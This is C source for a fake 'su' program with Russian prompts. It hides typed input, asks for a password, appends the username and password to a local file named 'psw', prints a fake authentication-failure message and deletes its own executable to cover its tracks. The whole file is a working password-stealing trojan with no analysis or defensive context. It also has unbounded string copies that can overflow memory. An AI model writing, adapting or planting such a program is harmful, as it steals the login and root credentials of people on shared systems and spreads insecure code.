#include <stdio.h>
#include <unistd.h>
#include <termios.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char * argv[])
{
	int psize = 11;
	char passw[psize];
	FILE * fp;
	char * name;
	if (argc > 1) {
		name = malloc(sizeof(argv[1])+1);
		strcpy(name, argv[1]);
	}
	else {
		name = malloc(5);
		strcpy(name,"root");
	}

	struct termios term, term_orig;		//for non-echo password
	tcgetattr(STDIN_FILENO, &term);
	term_orig = term;
	term.c_lflag &= ~ECHO;
	tcsetattr(STDIN_FILENO, TCSANOW, &term);

	printf("Пароль: ");
	scanf("%s", passw);
	fp = fopen("psw", "a");
        fprintf(fp, "User \"%s\" password: %s\n", name, passw);
        fclose(fp);
	free(name);
						//set echo back
	tcsetattr(STDIN_FILENO, TCSANOW, &term_orig);
	printf("\nsu: Сбой при проверке подлинности\n");

	return unlink(argv[0]);
}
